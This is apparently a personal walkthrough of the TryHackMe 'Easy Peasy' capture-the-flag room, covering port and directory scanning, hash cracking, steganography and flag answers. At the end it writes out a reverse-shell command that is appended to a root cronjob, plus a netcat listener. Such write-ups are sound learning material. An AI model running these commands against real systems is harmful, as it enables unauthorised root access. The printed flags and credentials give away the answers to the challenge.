---
title: Walkthrough - Easy Peasy
published: True
---

Practice using tools such as Nmap and GoBuster to locate a hidden directory to get initial access to a vulnerable machine. Then escalate your privileges through a vulnerable cronjob.

[https://tryhackme.com/room/easypeasyctf](https://tryhackme.com/room/easypeasyctf)

* * *

## Notes

- Perform an nmap scan ``sudo nmap -Pn -sS -p- -T4 10.10.140.191 -vvv`` while waiting for results check webserver and start gobuster
- ``gobuster dir -u http://10.10.140.191 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt -t 100 --no-error``

Find a hidden directory with nothing else there but we can further enumerate and gobust that one.

```shell
PORT      STATE SERVICE VERSION
80/tcp    open  http    nginx 1.16.1
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.16.1
6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 30:4a:2b:22:ac:d9:56:09:f2:da:12:20:57:f4:6c:d4 (RSA)
|   256 bf:86:c9:c7:b7:ef:8c:8b:b9:94:ae:01:88:c0:85:4d (ECDSA)
|_  256 a1:72:ef:6c:81:29:13:ef:5a:6c:24:03:4c:fe:3d:0b (ED25519)
65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.43 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- gobuster found ``/hidden/whatever`` inside the source code we find base64 ``ZmxhZ3tmMXJzN19mbDRnfQ==`` and our first flag
- time to gobust the other server on port 65524

![0xskar](/assets/easy-peasy-flag03.png)

- we find robots.txt on 65524

```html
User-Agent:*
Disallow:/
Robots Not Allowed
User-Agent:a18672860d0510e5ab6699730763b250
Allow:/
This Flag Can Enter But Only This Flag No More Exceptions
```

- ``gobuster dir -u http://10.10.140.191:65524/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 100 -x txt --no-error -a a18672860d0510e5ab6699730763b250``
- Turns out the user agent is a md5 hash for our second flag

- after a few hours i guess haveto be more careful about looking through source code. Found base encoded data that i threw into cyberchef to decode. it's not your regular base32 or 64 or 58 encode. This leads us to another hidden directory.

![0xskar](/assets/easy-peasy04.png)

- lets check out ``/n0th1ng3ls3m4tt3r``
- download the jpg.
- also found ``940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81`` in the source code. save to ``nothingelsematters.hash`` and feed it to john
- ``john nothingelsematters.hash --wordlist=easypeasy.txt --format=gost`` gives us ``mypasswordforthatjob``
- ``stegseek binarycodepixabay.jpg ./easypeasy.txt`` gives us ``secrettext.txt`` with credentials and a password in binary. Wait its actually ASCII and ``iconvertedmypasswordtobinary``
- credentials ``boring:iconvertedmypasswordtobinary``

* * * 

## What is the user flag?

- affine cipher - A=1,B=13

* * * 

## What is the root flag?

- ``cat /etc/crontab`` we find ``* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh``
- ``echo "sh -i >& /dev/tcp/10.2.127.225/6670 0>&1" >> .mysecretcronjob.sh``
- on attacker machine ``nc -nvlp 6670`` then ``cat /root/.root.txt``

* * * 

